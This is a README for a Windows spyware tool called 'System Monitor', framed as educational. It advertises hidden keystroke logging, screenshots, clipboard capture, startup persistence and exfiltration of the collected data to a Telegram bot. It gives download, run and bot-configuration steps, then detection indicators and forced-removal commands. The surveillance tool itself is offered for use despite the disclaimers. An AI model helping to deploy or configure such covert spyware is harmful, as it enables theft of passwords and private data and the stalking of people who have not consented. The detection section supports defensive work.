# 🔍 System Monitor

> **⚠️ WARNING: This tool is for educational and authorized security testing purposes only. Misuse of this software may violate local, state, and federal laws.**

## 📖 Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Configuration](#configuration)
- [Security Implications](#security-implications)
- [Legal Considerations](#legal-considerations)
- [Detection & Removal](#detection--removal)
- [Educational Purpose](#educational-purpose)

## 🎯 Overview

System Monitor is a comprehensive monitoring tool designed for cybersecurity education and authorized penetration testing. It demonstrates various surveillance techniques that can be used for legitimate security assessments.

**⚠️ Legal Notice**: Only use on systems you own or have explicit written permission to monitor. Unauthorized use may result in legal consequences.

## ✨ Features

| Feature | Description | Interval |
|---------|-------------|----------|
| **Keystroke Logging** | Records all keyboard input with word-level accumulation | Real-time |
| **Screenshot Capture** | Takes periodic screenshots of the desktop | Configurable |
| **Window Activity Tracking** | Monitors active application changes | 5 seconds |
| **Clipboard Monitoring** | Logs all clipboard content changes | 10 seconds |
| **Stealth Operation** | Runs completely hidden in background | N/A |
| **Auto-Startup Persistence** | Automatically adds to Windows startup | On first run |
| **Remote Data Export** | Sends collected data to Telegram | Configurable |
| **Self-Cleaning** | Automatically deletes local files after transmission | After send |

## 🛠️ Installation

### Prerequisites
- Windows 10/11
- Python 3.8+ (for source version)
- Internet connection (for Telegram functionality)

### Method 1: Source Code Version
```bash
# Clone repository
[git clone https://github.com/yourusername/system-monitor.git](https://github.com/Mridul01154/Python-Remote-Keylogger.git)
cd system-monitor

# Install dependencies
pip install -r requirements.txt

```
METHOD 2: STANDALONE EXECUTABLE

1. Download SystemMonitor.exe from the releases section
2. Run the executable file
3. The application automatically hides and begins operation in background

CONFIGURATION

TELEGRAM SETUP:
- Create a bot using @BotFather on Telegram
- Obtain your bot token and chat ID
- Update these values in the configuration:

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"

TIMING CONFIGURATION:
Modify the send interval in the code:

interval=60      # 1 minute
interval=300     # 5 minutes
interval=1800    # 30 minutes
interval=3600    # 1 hour
interval=86400   # 24 hours

SECURITY IMPLICATIONS

ATTACK VECTORS DEMONSTRATED:
- Keylogging: Captures all keyboard input including passwords
- Screen Capture: Records sensitive visual information
- Data Exfiltration: Transmits data to external servers
- Persistence: Maintains access across reboots
- Stealth Operation: Avoids user detection

DEFENSIVE MEASURES:

Network Monitoring:
# Detect outgoing connections
netstat -an | findstr :443

# Monitor for Telegram API calls
tcpdump -i any -n host api.telegram.org

Process Detection (PowerShell):
Get-Process | Where-Object {$_.ProcessName -like "*python*" -or $_.ProcessName -like "*monitor*"}
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location

File System Monitoring:
# Check for suspicious files
dir /s /b *.pyw
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

LEGAL CONSIDERATIONS

PERMITTED USES:
- Personal devices you own
- Corporate systems with written authorization
- Academic research with proper oversight
- Law enforcement with legal warrants
- Security testing in controlled environments

PROHIBITED USES:
- Monitoring without consent
- Employee surveillance without disclosure
- Government surveillance without legal authority
- Academic dishonesty
- Stalking or harassment

RELEVANT LAWS:
- Computer Fraud and Abuse Act (CFAA)
- Electronic Communications Privacy Act
- General Data Protection Regulation (GDPR)
- California Consumer Privacy Act (CCPA)
- Various state wiretapping laws

DETECTION & REMOVAL

DETECTION INDICATORS:
- Network: Regular HTTPS calls to api.telegram.org
- Process: Hidden Python or SystemMonitor processes
- Files: Temporary screenshots and log files
- Startup: Entries in Windows startup folder

REMOVAL INSTRUCTIONS:

Manual Removal:
1. Stop Processes:
   taskkill /f /im python.exe
   taskkill /f /im SystemMonitor.exe

2. Remove Startup Entry:
   del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\monitor.*"

3. Clean Files:
   del /s /q productivity_log.txt
   rmdir /s /q screenshots

Automated Removal (PowerShell):
Stop-Process -Name "python", "SystemMonitor" -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor.*" -Force
Remove-Item "productivity_log.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "screenshots" -Recurse -Force -ErrorAction SilentlyContinue

EDUCATIONAL PURPOSE

This project serves as an educational resource for:

Cybersecurity Students:
- Understanding monitoring techniques
- Learning about persistence mechanisms
- Studying data exfiltration methods

Security Professionals:
- Testing defensive controls
- Developing detection rules
- Understanding attacker methodologies

System Administrators:
- Learning detection techniques
- Implementing monitoring controls
- Developing incident response procedures

Academic Research:
- Malware analysis studies
- Digital forensics training
- Security control evaluation

RESPONSIBLE DISCLOSURE

If you discover this software being used maliciously:
1. Document Evidence: Collect logs and network captures
2. Contact Authorities: Report to appropriate law enforcement
3. Corporate Security: Notify organizational security teams
4. Legal Counsel: Seek professional legal advice

LICENSE AND DISCLAIMER

This project is licensed for educational purposes only. Users are solely responsible for ensuring their use complies with all applicable laws.

DISCLAIMER: The developers are not responsible for any misuse of this software. Always ensure you have proper authorization before using any monitoring tools.

Last Updated: 2024 | Version: 1.0
Download SystemMonitor.exe from releases

